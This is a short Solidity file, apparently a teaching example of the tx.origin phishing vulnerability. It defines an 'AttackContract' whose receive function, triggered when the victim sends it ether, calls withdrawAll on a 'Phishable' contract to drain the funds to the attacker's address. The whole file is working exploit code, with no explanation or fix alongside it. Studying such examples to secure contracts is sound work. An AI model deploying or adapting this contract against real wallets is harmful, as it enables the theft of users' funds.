// SPDX-License-Identifier: ISC
pragma solidity ^0.7.0;

import "Phishable.sol";

contract AttackContract {

    Phishable phishableContract;
    address attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    receive () external payable {
        phishableContract.withdrawAll(attacker);
    }
}